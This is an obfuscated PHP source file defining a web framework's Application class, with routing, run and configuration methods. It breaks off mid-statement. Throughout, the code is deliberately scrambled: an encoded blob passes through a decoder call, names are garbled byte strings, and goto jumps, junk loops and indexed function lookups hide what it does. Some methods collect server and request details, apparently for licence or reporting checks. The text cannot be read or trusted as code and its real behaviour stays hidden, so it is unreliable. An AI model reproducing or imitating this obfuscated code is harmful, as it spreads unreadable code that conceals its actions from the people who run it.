Cô¤‹ãI')._kodDe('MRIeEQEtRFxdQwgXXVJP9YNTKX5U1j1nZr401GPusURNxAf1s46aaSRqZWbN1iWoA7UZTMyxDUsbew==')."\x23\x2d\x35\xc3\x8d\x53\xdc\x44\xa3\xdd\x89\xca\x70\x92\x57\x28\x99\x46\x1b\xc9\x9e\x44\x93\x93\x79\xe9\xfc\xae\x12\xc8\x11\x21\x2f\x2\x3f\x93\x8e\x8e\x99\x2\xc1\x48\xcc\xb7\xd8\x1f\x8e\x84\x4b\x92\x7a\x3d\xe1\x70\x7f\x30\xe4"."\305\132\261\45\311\50\227\240\211\120\222\324\333\25\14\114\226\346\353\361\370\273\113\322\240\146\2\324\325\245\17\245\342\44\177\57\252\245\247\273\233\252\306\225\326\302\337\276\220\327\4\335\265\361\163\340\102"."\106\243\307\252\66\265\35\172\154\36\226\351\154\24\37\360\120\162\354\230\113\50\302\172\4\41\16\263\101\37\357\145\201\102\311\26\105\220\56\240\366\100\200\24\26\242\16\50\341\53\363\214\263\60\161\31\65"."\110\124\115\342\267\211\56\313\255\243\0\107\223\5\361\67\201\10\305\265\33\1\210\52\255\355\216\307\326\201\245\167\234\366\173\103\336\41\260\336\13\250\3\212\25\132\134\270\70\302\54\320\302\374\104\375\17"."\34\266\44\3\336\22\321\42\162\232\360\22\50\315\360\130\333\270\30\26\317\112\132\30\53\61\345\64\275\341\267\163\171\341\112\33\366\322\377\3\127\222\241\331\110\306\0\0", 10, -8))); goto DÔãĞ™ÚÙ; dÅìâ›ï¬ì: $fßØïÜ‡æÂ = $_SERVER[³‘’¼äÑ™ÔÍ][551]; while (strlen($fßØïÜ‡æÂ) < $_SERVER[³‘’¼äÑ™ÔÍ][552]) { if (!$fßØïÜ‡æÂ) { break; } $fßØïÜ‡æÂ++; } class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\x69\x6e\144\x65\170"; private $defaultAction = "\x69\156\144\145\170"; function __construct() { } public function setDefault($E™íÌ“‡Ë²) { goto D†‚Â¡¢š; a»™ŠŠÖğ…: $this->defaultAction = $C´¯ê¬´Â[2] ? $C´¯ê¬´Â[2] : $this->defaultAction; $B…›Õ•¬œ = $cìÂ¸ÛŞÊï[556]; if (strlen($B…›Õ•¬œ) < $cìÂ¸ÛŞÊï[557]) { die; } goto b¦·ˆÔô; dÕİ‡›Ñ†Ã: $Aˆ¦Àº„´Ì = $cìÂ¸ÛŞÊï[555]; while (strlen($Aˆ¦Àº„´Ì) < $cìÂ¸ÛŞÊï[548]) { if (!$Aˆ¦Àº„´Ì) { break; } $Aˆ¦Àº„´Ì++; } $this->defaultController = $C´¯ê¬´Â[1] ? $C´¯ê¬´Â[1] : $this->defaultController; goto a»™ŠŠÖğ…; D†‚Â¡¢š: $cìÂ¸ÛŞÊï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÄ“†É½²ê =& $_SERVER[Ü âªøğÕå]; $C´¯ê¬´Â = $bÄ“†É½²ê[0]($bÄ“†É½²ê[1], $bÄ“†É½²ê[2]($E™íÌ“‡Ë², $bÄ“†É½²ê[1])); goto d™Í»ƒŠæ¯; b¦·ˆÔô: $this->{$_SERVER[Ü âªøğÕå][3]}($bÄ“†É½²ê[4], array($this, $bÄ“†É½²ê[5])); goto D’ƒáÉÇùİ; d™Í»ƒŠæ¯: $cÃæÅò‘Ê» = $cìÂ¸ÛŞÊï[553]; while ($cÃæÅò‘Ê» < $cìÂ¸ÛŞÊï[554]) { if ($cÃæÅò‘Ê» >= 0) { break; } $cÃæÅò‘Ê»++; } $this->defaultModule = $C´¯ê¬´Â[0] ? $C´¯ê¬´Â[0] : $this->defaultModule; goto dÕİ‡›Ñ†Ã; D’ƒáÉÇùİ: } public function appRun($fº·‚ñØâ) { goto fƒ­Çµôã§; E’îé§»äÉ: $c¥æ´»åÂë = $C·‹ç¿í´[7]; $Bš‰…ÓÒ˜â = $cÃ‹¢ï×ò[559]; if (!$Bš‰…ÓÒ˜â) { return; } goto a†Š¨¶Ûó; eÜŸøÔ•Ä¸: $b‡ØÆÂßÕÉ = $C·‹ç¿í´[6]($B„˜èêòà[0]); $A¨¾ñ° = $cÃ‹¢ï×ò[558]; if (strlen($A¨¾ñ°) < $cÃ‹¢ï×ò[557]) { die; } goto E’îé§»äÉ; a†Š¨¶Ûó: if ($b‡ØÆÂßÕÉ == $C·‹ç¿í´[8]) { $c¥æ´»åÂë = $C·‹ç¿í´[9]; $B„˜èêòà[0] = $C·‹ç¿í´[10]; $B„˜èêòà[1] = $B„˜èêòà[1] . $C·‹ç¿í´[11]; $fº·‚ñØâ = $C·‹ç¿í´[12]($C·‹ç¿í´[1], $B„˜èêòà); $fº·‚ñØâ = $C·‹ç¿í´[2]($fº·‚ñØâ, $C·‹ç¿í´[1]); } $C·‹ç¿í´[13](array($C·‹ç¿í´[14], $C·‹ç¿í´[15]), $c¥æ´»åÂë . $C·‹ç¿í´[16], $fº·‚ñØâ); $C·‹ç¿í´[17]($fº·‚ñØâ); goto cšëõÁ³­Ò; fƒ­Çµôã§: $cÃ‹¢ï×ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C·‹ç¿í´ =& $_SERVER[Ü âªøğÕå]; $B„˜èêòà = $C·‹ç¿í´[0]($C·‹ç¿í´[1], $fº·‚ñØâ); goto eÜŸøÔ•Ä¸; cšëõÁ³­Ò: $C†÷ÅÜ¾¥ = $cÃ‹¢ï×ò[560]; $C·‹ç¿í´[13](array($C·‹ç¿í´[14], $C·‹ç¿í´[15]), $c¥æ´»åÂë . $C·‹ç¿í´[18], $fº·‚ñØâ); goto E¹Ş‘çĞ÷˜; E¹Ş‘çĞ÷˜: } private function autorun() { $F‘—êÖ–µ¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C¸É–ÄŸî„ =& $_SERVER[Ü âªøğÕå]; global $config; if ($C¸É–ÄŸî„[19]($config[$C¸É–ÄŸî„[20]]) == 0) { return; } foreach ($config[$C¸É–ÄŸî„[20]] as $DïÈÊìòÄ => $fİœÄê¹) { $this->{$_SERVER[Ü âªøğÕå][21]}($fİœÄê¹); $c‹áê†®± = $F‘—êÖ–µ¹[561]; if (strlen($c‹áê†®±) < $F‘—êÖ–µ¹[548]) { return; } } } private function ahice986e43a() { goto f¢…»¦·®£; A­™ßè‘­ö: if (!$cŸ÷ŒšÛÊµ || $D…•öñŞœ[24]($cŸ÷ŒšÛÊµ) <= $D…•öñŞœ[24]($DÈÙçä…ÔÀ)) { return; } if ($D…•öñŞœ[6]($D…•öñŞœ[25]($cŸ÷ŒšÛÊµ, -$D…•öñŞœ[24]($DÈÙçä…ÔÀ))) != $DÈÙçä…ÔÀ) { return; } $bõ‰Ñƒ‹¿Ó = $D…•öñŞœ[25]($cŸ÷ŒšÛÊµ, 0, -$D…•öñŞœ[24]($DÈÙçä…ÔÀ)); goto dÙ¨õ­èğò; dôŸññŠ—: $CˆóÉ †ç¥ = $eù™¨Ğ÷ö†[564]; goto A¢Î¸¶Ş›Œ; B¢áÅÄÛ·: $cŸ÷ŒšÛÊµ = $GLOBALS[$D…•öñŞœ[22]][$D…•öñŞœ[23]][0]; $C°«‡ÉêÄÙ = $eù™¨Ğ÷ö†[562]; if (!$C°«‡ÉêÄÙ) { return; } goto A­™ßè‘­ö; dÙ¨õ­èğò: $Føğ‡İ½›ğ = array($D…•öñŞœ[8], $bõ‰Ñƒ‹¿Ó); $DË—«ˆÃå™ = $D…•öñŞœ[26]($GLOBALS[$D…•öñŞœ[22]][$D…•öñŞœ[23]], 1); $GLOBALS[$D…•öñŞœ[22]][$D…•öñŞœ[23]] = $D…•öñŞœ[27]($Føğ‡İ½›ğ, $DË—«ˆÃå™); goto Dëô’¦š‡Ñ; Dëô’¦š‡Ñ: $C„“Ë­äÇÔ = $eù™¨Ğ÷ö†[563]; while (strlen($C„“Ë­äÇÔ) < $eù™¨Ğ÷ö†[557]) { if (!$C„“Ë­äÇÔ) { break; } $C„“Ë­äÇÔ++; } $GLOBALS[$D…•öñŞœ[22]][$D…•öñŞœ[28]] = $D…•öñŞœ[29]($D…•öñŞœ[1], $GLOBALS[$D…•öñŞœ[22]][$D…•öñŞœ[23]]); goto dôŸññŠ—; f¢…»¦·®£: $eù™¨Ğ÷ö† =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D…•öñŞœ =& $_SERVER[Ü âªøğÕå]; $DÈÙçä…ÔÀ = $D…•öñŞœ[8]; goto B¢áÅÄÛ·; A¢Î¸¶Ş›Œ: } private function rgsv28614e76() { goto C¼µôâå±Ò; D‹ŠŒªÖ¼: $Eõò¥êÂà = $bÇ¹®„—æ°[569]; if (!$Eõò¥êÂà) { return; } goto a‹ğ˜Ú³âô; dÃ¹ Ú»·: $e„³‚º‡‹ = $_SERVER[$CÓõ“Î™Û–[30]]; $e’ñ”ÂÇ½ = $bÇ¹®„—æ°[565]; while (strlen($e’ñ”ÂÇ½) < $bÇ¹®„—æ°[557]) { if (!$e’ñ”ÂÇ½) { break; } $e’ñ”ÂÇ½++; } goto d°Š±ô†ƒŞ; AÆÎ“İÅÛ“: $CÓõ“Î™Û–[34]($CÓõ“Î™Û–[35], $d­Â„óÌŒÒ, $dšÅÚç»Š–); $d­Â„óÌŒÒ = $CÓõ“Î™Û–[2]($dšÅÚç»Š–[0][0], $CÓõ“Î™Û–[36]); $A˜½¼«ì¯ = $bÇ¹®„—æ°[567]; goto a……´»É™‰; C¼µôâå±Ò: $bÇ¹®„—æ° =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CÓõ“Î™Û– =& $_SERVER[Ü âªøğÕå]; if ($GLOBALS[$CÓõ“Î™Û–[22]][$CÓõ“Î™Û–[28]] != $CÓõ“Î™Û–[10]) { return; } goto dÃ¹ Ú»·; dºÅ©¦„ÆÙ: if (!$CÓõ“Î™Û–[32]($e„³‚º‡‹, $DÒ³ŒªÀ¨–)) { return; } $C¦ÖÂÌ‚–ê = $CÓõ“Î™Û–[33]($e„³‚º‡‹, $DÒ³ŒªÀ¨–); $d­Â„óÌŒÒ = $CÓõ“Î™Û–[25]($e„³‚º‡‹, $C¦ÖÂÌ‚–ê + $CÓõ“Î™Û–[24]($DÒ³ŒªÀ¨–)); goto AÆÎ“İÅÛ“; a……´»É™‰: $GLOBALS[$CÓõ“Î™Û–[22]][$CÓõ“Î™Û–[23]] = $CÓõ“Î™Û–[0]($CÓõ“Î™Û–[36], $d­Â„óÌŒÒ); $b®Ã×ºªğõ = $bÇ¹®„—æ°[568]; $GLOBALS[$CÓõ“Î™Û–[22]][$CÓõ“Î™Û–[28]] = $CÓõ“Î™Û–[29]($CÓõ“Î™Û–[1], $GLOBALS[$CÓõ“Î™Û–[22]][$CÓõ“Î™Û–[23]]); goto D‹ŠŒªÖ¼; d°Š±ô†ƒŞ: $DÒ³ŒªÀ¨– = $CÓõ“Î™Û–[31]; $b¢ °¨Ô‘ = $bÇ¹®„—æ°[566]; if (!$b¢ °¨Ô‘) { return; } goto dºÅ©¦„ÆÙ; a‹ğ˜Ú³âô: } public function run() { goto a’±«õÀŒí; a’±«õÀŒí: $AÜ¹±ÅµòÚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÂ©‘…§µµ =& $_SERVER[Ü âªøğÕå]; $this->{$_SERVER[Ü âªøğÕå][37]}(); goto B‰è’¬¸º; d–ÙãÍˆÙê: $_SERVER[$aÂ©‘…§µµ[44]] = $aÂ©‘…§µµ[6](ACTION); $fÏ³â˜ÖÔ¯ = $AÜ¹±ÅµòÚ[574]; while (strlen($fÏ³â˜ÖÔ¯) < $AÜ¹±ÅµòÚ[554]) { if (!$fÏ³â˜ÖÔ¯) { break; } $fÏ³â˜ÖÔ¯++; } goto B¼¢ÙØ²Š¸; B‰è’¬¸º: $this->{$_SERVER[Ü âªøğÕå][38]}(); $Dò“øÌï = $AÜ¹±ÅµòÚ[570]; if (!$Dò“øÌï) { return; } goto A²‚œ„ğ‘²; B¼¢ÙØ²Š¸: $this->{$_SERVER[Ü âªøğÕå][45]}(); if ($aÂ©‘…§µµ[19]($aé¾âØÅ†) >= 3) { $this->{$_SERVER[Ü âªøğÕå][21]}($bœ¤µš®ÉÄ); } else { $this->{$_SERVER[Ü âªøğÕå][21]}(ACTION); } goto D¼Ê­Óğô¶; aš’ˆ”¦ˆ¸: $AÍ‚à”õÎ = $AÜ¹±ÅµòÚ[572]; $aÂ©‘…§µµ[39]($aÂ©‘…§µµ[40], isset($aé¾âØÅ†[0]) && $aé¾âØÅ†[0] ? $aé¾âØÅ†[0] : $this->defaultModule); $aÂ©‘…§µµ[39]($aÂ©‘…§µµ[41], isset($aé¾âØÅ†[1]) && $aé¾âØÅ†[0] ? $aé¾âØÅ†[1] : $this->defaultController); goto E·Àµßøï©; E·Àµßøï©: $aÂ©‘…§µµ[39]($aÂ©‘…§µµ[42], isset($aé¾âØÅ†[2]) && $aé¾âØÅ†[0] ? $aé¾âØÅ†[2] : $this->defaultAction); $a“Õ¾šâÁ¦ = $AÜ¹±ÅµòÚ[573]; $aÂ©‘…§µµ[39]($aÂ©‘…§µµ[43], MOD . $aÂ©‘…§µµ[1] . ST . $aÂ©‘…§µµ[1] . ACT); goto d–ÙãÍˆÙê; A²‚œ„ğ‘²: $aé¾âØÅ† = $GLOBALS[$aÂ©‘…§µµ[22]][$aÂ©‘…§µµ[23]]; $aèå‚ÑŠ‹ = $AÜ¹±ÅµòÚ[571]; $bœ¤µš®ÉÄ = $GLOBALS[$aÂ©‘…§µµ[22]][$aÂ©‘…§µµ[28]]; goto aš’ˆ”¦ˆ¸; D¼Ê­Óğô¶: } private $enga9269477c = array(); private $xihv98b18b0d = ''; public function xmuz763f8212() { goto DºßÒš¾òî; DºßÒš¾òî: $CŸ‰°è¸·÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b‚¾ñÕ•¢ä =& $_SERVER[Ü âªøğÕå]; $this->{$_SERVER[Ü âªøğÕå][46]}(); goto F¡ØåÕƒ®; F¡ØåÕƒ®: $this->{$_SERVER[Ü âªøğÕå][47]}(); $this->{$_SERVER[Ü âªøğÕå][48]}(); $this->{$_SERVER[Ü âªøğÕå][49]}(); goto eÊÈì¸¹¼; A¾¸İºôå: $this->{$_SERVER[Ü âªøğÕå][51]}(); $AùÇ‰ƒ´²‚ = $CŸ‰°è¸·÷[577]; if (!$AùÇ‰ƒ´²‚) { return; } goto AìÅòÄ“‰; AìÅòÄ“‰: $this->{$_SERVER[Ü âªøğÕå][52]}(); $c¯˜óÅ²¦‚ = $CŸ‰°è¸·÷[578]; while (strlen($c¯˜óÅ²¦‚) < $CŸ‰°è¸·÷[557]) { if (!$c¯˜óÅ²¦‚) { break; } $c¯˜óÅ²¦‚++; } goto b•î³œŒ¯­; cùñ°ğ‚‚â: $f†‚–©Ìö‘ = $CŸ‰°è¸·÷[579]; $this->{$_SERVER[Ü âªøğÕå][3]}($b‚¾ñÕ•¢ä[59], array($this, $b‚¾ñÕ•¢ä[60])); goto bë¢…åìøŸ; eÊÈì¸¹¼: $CÜà¯¿ × = $CŸ‰°è¸·÷[575]; $this->{$_SERVER[Ü âªøğÕå][50]}(); $e‹ƒ›æÅŒ = $CŸ‰°è¸·÷[576]; goto A¾¸İºôå; b•î³œŒ¯­: $this->{$_SERVER[Ü âªøğÕå][3]}($b‚¾ñÕ•¢ä[53], array($this, $b‚¾ñÕ•¢ä[54])); $this->{$_SERVER[Ü âªøğÕå][3]}($b‚¾ñÕ•¢ä[55], array($this, $b‚¾ñÕ•¢ä[56])); $this->{$_SERVER[Ü âªøğÕå][3]}($b‚¾ñÕ•¢ä[57], array($this, $b‚¾ñÕ•¢ä[58])); goto cùñ°ğ‚‚â; bë¢…åìøŸ: } public function lhqw2702523e($FĞ¡ôí¾‚) { goto a«µƒ¡Æğï; b¼ ÚĞµŸ: if (strlen($A­ãçºÏ’) < $a„òª›³²[548]) { return; } $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[120]] = $this->xihv98b18b0d; $E¥—•§„Ï° = $a„òª›³²[587]; goto aºÁÊØ¡› ; B¼Ûà–øÒ¥: $fóøææ = $a„òª›³²[580]; $DÆÑ–œßë = array($fÙæìÑ©ˆ[64], $fÙæìÑ©ˆ[65], $fÙæìÑ©ˆ[66], $fÙæìÑ©ˆ[67], $fÙæìÑ©ˆ[68], $fÙæìÑ©ˆ[69], $fÙæìÑ©ˆ[70], $fÙæìÑ©ˆ[71], $fÙæìÑ©ˆ[72], $fÙæìÑ©ˆ[73], $fÙæìÑ©ˆ[74], $fÙæìÑ©ˆ[75], $fÙæìÑ©ˆ[76], $fÙæìÑ©ˆ[77], $fÙæìÑ©ˆ[78], $fÙæìÑ©ˆ[79], $fÙæìÑ©ˆ[80], $fÙæìÑ©ˆ[81], $fÙæìÑ©ˆ[82], $fÙæìÑ©ˆ[83], $fÙæìÑ©ˆ[84], $fÙæìÑ©ˆ[85], $fÙæìÑ©ˆ[86], $fÙæìÑ©ˆ[87], $fÙæìÑ©ˆ[88], $fÙæìÑ©ˆ[89], $fÙæìÑ©ˆ[90]); $aÎÇ¡»†Ú§ = $a„òª›³²[581]; goto EŞªÃ³©Ş; aºÁÊØ¡› : if (strlen($E¥—•§„Ï°) < $a„òª›³²[548]) { return; } if ($dç˜ã¿—‚é[$fÙæìÑ©ˆ[120]] != $fÙæìÑ©ˆ[121]) { $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[122]] = $dç˜ã¿—‚é[$fÙæìÑ©ˆ[122]]; $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[123]] = $dç˜ã¿—‚é[$fÙæìÑ©ˆ[123]]; $E‰Ô¢·¦‚ = $fÙæìÑ©ˆ[124](10) . $this->xihv98b18b0d . $fÙæìÑ©ˆ[124](5); $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[125]][$fÙæìÑ©ˆ[126]] = $this->{$_SERVER[Ü âªøğÕå][127]}($E‰Ô¢·¦‚, $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[113]]); } if ($this->xihv98b18b0d == $fÙæìÑ©ˆ[121]) { $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[94]][$fÙæìÑ©ˆ[99]][$fÙæìÑ©ˆ[107]] = 0; } goto c…íŠÍš¸‘; C»ø“ªñ¼é: $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[109]] = $fÙæìÑ©ˆ[110]($fÙæìÑ©ˆ[111])->{$_SERVER[Ü âªøğÕå][112]}(); $C«·Éôø§ = $a„òª›³²[585]; if (strlen($C«·Éôø§) < $a„òª›³²[548]) { return; } goto A´¶¿¥—÷; A´¶¿¥—÷: $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[113]] = $fÙæìÑ©ˆ[114]($_SERVER[$fÙæìÑ©ˆ[115]] . $dç˜ã¿—‚é[$fÙæìÑ©ˆ[116]]); $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[117]] = $fÙæìÑ©ˆ[118]($fÙæìÑ©ˆ[119]()); $A­ãçºÏ’ = $a„òª›³²[586]; goto b¼ ÚĞµŸ; c…íŠÍš¸‘: $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[128]] = $fÙæìÑ©ˆ[104]($this->enga9269477c, $fÙæìÑ©ˆ[129], $fÙæìÑ©ˆ[10]); $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[130]] = $fÙæìÑ©ˆ[104]($this->enga9269477c, $fÙæìÑ©ˆ[131], $fÙæìÑ©ˆ[10]); $B·»„â‚œØ = $a„òª›³²[588]; goto EïµãÀàÕÖ; CãöÕÏ³¾³: if (strlen($cÖ•çÑ—¬ß) < $a„òª›³²[584]) { return; } unset($FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[95]][$fÙæìÑ©ˆ[96]]); unset($FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[95]][$fÙæìÑ©ˆ[97]]); goto A®™Ø«Ëë¿; A®™Ø«Ëë¿: unset($FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[94]][$fÙæìÑ©ˆ[76]]); unset($FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[94]][$fÙæìÑ©ˆ[98]]); $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[94]][$fÙæìÑ©ˆ[99]] = array($fÙæìÑ©ˆ[100] => (int) $Fëá„œ‹Ç‰[$fÙæìÑ©ˆ[101]], $fÙæìÑ©ˆ[102] => $fÙæìÑ©ˆ[103]($fÙæìÑ©ˆ[104]($Fëá„œ‹Ç‰, $fÙæìÑ©ˆ[105], array())), $fÙæìÑ©ˆ[106] => (int) $fÙæìÑ©ˆ[104]($Fëá„œ‹Ç‰, $fÙæìÑ©ˆ[107], 0)); goto C»ø“ªñ¼é; EŞªÃ³©Ş: foreach ($DÆÑ–œßë as $a™Û±ÛŒÊ) { $C ëÍÄ‡ˆ– = $GLOBALS[$fÙæìÑ©ˆ[91]][$fÙæìÑ©ˆ[92]][$a™Û±ÛŒÊ]; $E­«•¶Â¥ = $a„òª›³²[582]; while ($E­«•¶Â¥ < $a„òª›³²[557]) { if ($E­«•¶Â¥ >= 0) { break; } $E­«•¶Â¥++; } if (isset($dç˜ã¿—‚é[$a™Û±ÛŒÊ])) { $C ëÍÄ‡ˆ– = $dç˜ã¿—‚é[$a™Û±ÛŒÊ]; } $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[94]][$a™Û±ÛŒÊ] = $C ëÍÄ‡ˆ–; } $Fëá„œ‹Ç‰ = $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[93]][$fÙæìÑ©ˆ[94]][$fÙæìÑ©ˆ[76]]; $cÖ•çÑ—¬ß = $a„òª›³²[583]; goto CãöÕÏ³¾³; EïµãÀàÕÖ: if (strlen($B·»„â‚œØ) < $a„òª›³²[548]) { die; } if ($fÙæìÑ©ˆ[104]($GLOBALS, $fÙæìÑ©ˆ[132]) && $this->config[$fÙæìÑ©ˆ[133]]) { $FĞ¡ôí¾‚[$fÙæìÑ©ˆ[108]][$fÙæìÑ©ˆ[134]] = WEB_ROOT; } return $FĞ¡ôí¾‚; goto d±œî›„¹š; a«µƒ¡Æğï: $a„òª›³² =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÙæìÑ©ˆ =& $_SERVER[Ü âªøğÕå]; $dç˜ã¿—‚é = $fÙæìÑ©ˆ[61]($fÙæìÑ©ˆ[62])->{$_SERVER[Ü âªøğÕå][63]}(); goto B¼Ûà–øÒ¥; d±œî›„¹š: } private function islg376962bb() { goto d®½»‡ĞÑ; d®½»‡ĞÑ: $E®Ğˆ–óÀ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‹æñïÛÂ =& $_SERVER[Ü âªøğÕå]; if ($_SERVER[$C‹æñïÛÂ[44]] == $C‹æñïÛÂ[135]) { goto B¥ÜùÆì; B¥ÜùÆì: $d…¾Ä¾ßÔœ = array($C‹æñïÛÂ[120] => $this->xihv98b18b0d, $C‹æñïÛÂ[136] => $this->{$_SERVER[Ü âªøğÕå][137]}(), $C‹æñïÛÂ[138] => $C‹æñïÛÂ[61]($C‹æñïÛÂ[139])->{$_SERVER[Ü âªøğÕå][140]}()); if ($this->xihv98b18b0d != $C‹æñïÛÂ[121]) { $aŒë‘¬ÂÏ„ = $C‹æñïÛÂ[104]($this->enga9269477c, $C‹æñïÛÂ[141]); if ($aŒë‘¬ÂÏ„) { $d…¾Ä¾ßÔœ[$C‹æñïÛÂ[142]] = $aŒë‘¬ÂÏ„; $d…¾Ä¾ßÔœ[$C‹æñïÛÂ[143]] = $C‹æñïÛÂ[144]($C‹æñïÛÂ[104]($this->enga9269477c, $C‹æñïÛÂ[145])); $d…¾Ä¾ßÔœ[$C‹æñïÛÂ[146]] = $C‹æñïÛÂ[104]($this->enga9269477c, $C‹æñïÛÂ[131]); } } $d…¾Ä¾ßÔœ = $this->{$_SERVER[Ü âªøğÕå][147]}($C‹æñïÛÂ[148]($d…¾Ä¾ßÔœ), $C‹æñïÛÂ[114]($C‹æñïÛÂ[149])); goto a¬³ªËĞë¿; dÄŞåí›²: while ($cÆĞ©¸æ£š < $E®Ğˆ–óÀ[584]) { if ($cÆĞ©¸æ£š >= 0) { break; } $cÆĞ©¸æ£š++; } goto AÓ…ª“µÌê; a¬³ªËĞë¿: $CÙñŒ°²‰Ä = array($C‹æñïÛÂ[150] => $d…¾Ä¾ßÔœ); $C‹æñïÛÂ[13](array($C‹æñïÛÂ[151], $C‹æñïÛÂ[152]), $CÙñŒ°²‰Ä); $cÆĞ©¸æ£š = $E®Ğˆ–óÀ[589]; goto dÄŞåí›²; AÓ…ª“µÌê: } goto bñÃö¶µ°ƒ; CºÎàİêƒ: if (!$AŠ°±Ş²à‡) { die; } $CÙñŒ°²‰Ä = array($C‹æñïÛÂ[159] => $E¤¦·À›·‰[$C‹æñïÛÂ[64]], $C‹æñïÛÂ[160] => $E¤¦·À›·‰[$C‹æñïÛÂ[65]], $C‹æñïÛÂ[161] => $C‹æñïÛÂ[10]); $eçõò°ŠÕ˜ = $E®Ğˆ–óÀ[592]; goto AÚôÆãó; bñÃö¶µ°ƒ: if ($this->xihv98b18b0d == $C‹æñïÛÂ[121]) { return; } $b‹İÌŠ…ÇÈ = array($C‹æñïÛÂ[153], $C‹æñïÛÂ[154], $C‹æñïÛÂ[155], $C‹æñïÛÂ[156], $C‹æñïÛÂ[157], $C‹æñïÛÂ[158]); $Cí«ˆŠ˜ê = $E®Ğˆ–óÀ[590]; goto EèÄïÊƒÈÂ; AÚôÆãó: if (strlen($eçõò°ŠÕ˜) < $E®Ğˆ–óÀ[557]) { die; } foreach ($b‹İÌŠ…ÇÈ as $EĞÓÚÙ‰•÷) { if (!isset($E¤¦·À›·‰[$EĞÓÚÙ‰•÷]) || !$E¤¦·À›·‰[$EĞÓÚÙ‰•÷]) { continue; } $CÙñŒ°²‰Ä[$EĞÓÚÙ‰•÷] = $E¤¦·À›·‰[$EĞÓÚÙ‰•÷]; $a»ŒŸ‘ÚÓİ = $E®Ğˆ–óÀ[593]; if (!$a»ŒŸ‘ÚÓİ) { die; } } $C‹æñïÛÂ[13](array($C‹æñïÛÂ[151], $C‹æñïÛÂ[152]), $CÙñŒ°²‰Ä); goto aÍÇ½ƒ½Ş; EèÄïÊƒÈÂ: if (strlen($Cí«ˆŠ˜ê) < $E®Ğˆ–óÀ[557]) { return; } $E¤¦·À›·‰ = $C‹æñïÛÂ[61]($C‹æñïÛÂ[62])->{$_SERVER[Ü âªøğÕå][63]}(); $AŠ°±Ş²à‡ = $E®Ğˆ–óÀ[591]; goto CºÎàİêƒ; aÍÇ½ƒ½Ş: } private function crnb6f1f2e7a() { goto cé‰­Õà¥À; CÜÌ†âó«: $bĞÁåøó™ = $EÈ¼·«õÀ©[601]; $DÔ¸™„œäª = $b‡”ßæêåÛ[$BË·¡Èª ¼[225]]; $d­øÛŒ±õ™ = $EÈ¼·«õÀ©[602]; goto bğèæÇ ‰Ë; Dê¬Â›ÎÚ¡: $aÈìğÚÎ› = $EÈ¼·«õÀ©[603]; while (strlen($aÈìğÚÎ›) < $EÈ¼·«õÀ©[554]) { if (!$aÈìğÚÎ›) { break; } $aÈìğÚÎ›++; } $BË·¡Èª ¼[61]($BË·¡Èª ¼[11])->{$_SERVER[Ü âªøğÕå][226]}($DÔ¸™„œäª[$BË·¡Èª ¼[227]], array($BË·¡Èª ¼[228] => $f®äöš¹ˆá)); goto d·—î•Á¥¢; då¼³‘°àË: $AÓ«ãÚ˜­ = $EÈ¼·«õÀ©[598]; if (!$AÓ«ãÚ˜­) { die; } $DòÒŠ±§ó…[$BË·¡Èª ¼[123]] = $BË·¡Èª ¼[118]($BË·¡Èª ¼[214]($this->{$_SERVER[Ü âªøğÕå][147]}($eĞ«„÷§½, $BË·¡Èª ¼[216]))); goto aç©„“¶îİ; cŒÓ±Ûšë: $F¯ƒ–£ìá = $BË·¡Èª ¼[114]($_SERVER[$BË·¡Èª ¼[115]] . $BÅãµ®§ÅÑ); $A ·²½ÎåÜ = $EÈ¼·«õÀ©[594]; if (!$A ·²½ÎåÜ) { die; } goto D¦˜Ï‹½Œ; f°“÷£ù˜ì: $aõñŞñÏô = $EÈ¼·«õÀ©[599]; $DãÆ’Ö›Œ = $BË·¡Èª ¼[214]($BË·¡Èª ¼[25]($B–ÃóÌ‡Ü¡, 10, 16)); $c­È£¯ïÁ¼ = $EÈ¼·«õÀ©[600]; goto F˜É—äµ¾; D¦˜Ï‹½Œ: if ($D»ÎâÎ›†—[$BË·¡Èª ¼[178]] == $BË·¡Èª ¼[179]) { $E™Ğäî…ÕÙ = $this->{$_SERVER[Ü âªøğÕå][147]}($F¯ƒ–£ìá, $BË·¡Èª ¼[180]); $F÷”Æí¤ê¾ = $this->{$_SERVER[Ü âªøğÕå][127]}($BË·¡Èª ¼[148]($A™ëµ—îèË), $F¯ƒ–£ìá . $BË·¡Èª ¼[181], 3); $E‘ÇöÚºãË = $this->{$_SERVER[Ü âªøğÕå][182]}($BË·¡Èª ¼[183] . $E™Ğäî…ÕÙ . $BË·¡Èª ¼[184] . $F÷”Æí¤ê¾, -1); $BË·¡Èª 